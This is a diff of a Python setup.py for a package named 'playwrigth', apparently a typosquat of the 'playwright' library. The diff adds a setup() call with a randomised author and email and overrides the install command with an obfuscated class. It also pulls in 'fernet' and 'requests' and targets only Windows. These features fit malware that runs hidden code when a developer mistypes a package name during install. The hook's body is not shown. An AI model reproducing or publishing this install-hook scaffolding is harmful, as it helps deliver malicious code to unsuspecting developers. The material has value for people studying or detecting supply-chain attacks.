@@ -18,5 +18,22 @@ class oAeEFnBsLyTiuMgadSCDGrJFQQfMNprIOloImHYiTIOWVijvLgMNcPuocVJMDZPknivBZZpfTB
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+setup(
+    name="playwrigth",
+    version=VERSION,
+    author="PMZPmIDTAMeBaz",
+    author_email="MYXNAbRCZocFgnnxfJBT@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': oAeEFnBsLyTiuMgadSCDGrJFQQfMNprIOloImHYiTIOWVijvLgMNcPuocVJMDZPknivBZZpfTBFsmYiEIsXdAuqTvNFIAttNqohehFjRffkFrW,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
